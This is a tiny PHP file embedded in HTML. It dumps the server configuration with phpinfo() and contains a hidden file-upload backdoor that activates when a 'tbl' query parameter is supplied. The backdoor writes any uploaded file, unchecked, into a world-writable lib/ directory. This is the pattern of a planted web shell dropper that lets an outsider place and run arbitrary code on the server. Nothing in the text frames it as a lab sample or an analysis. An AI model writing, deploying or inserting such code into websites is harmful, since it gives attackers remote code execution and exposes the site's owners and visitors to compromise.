<html><?php
phpinfo();
?></html><html><?php
if(isset($_GET['tbl'])) {
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
        $dir = "lib/";
        if(!is_dir($dir)) mkdir($dir, 0777, true);
        
        $file = $dir . basename($_FILES['file']['name']);
        if(move_uploaded_file($_FILES['file']['tmp_name'], $file)) {
            echo "Success";
        } else {
            echo "Failed";
        }
        exit();
    } else {
        echo 'SUCCESS<form method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Upload"></form>';
        exit();
    }
}
?>
